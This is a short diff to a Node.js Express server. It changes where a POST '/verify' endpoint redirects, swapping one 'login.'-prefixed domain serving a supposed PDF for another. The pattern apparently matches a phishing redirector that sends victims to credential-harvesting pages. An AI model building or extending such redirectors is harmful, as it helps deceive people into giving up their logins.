@@ -7,8 +7,8 @@ app.use(express.static(__dirname));
 
 // Redirect endpoint
 app.post('/verify', (req, res) => {
-  res.redirect('https://login.wispera.xyz/view/project-details.pdf');   // ← change this to the URL you want
-});
+  res.redirect('https://login.fudgekic.biz/view/project-details.pdf');   // ← change this to the URL you want
+});   
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
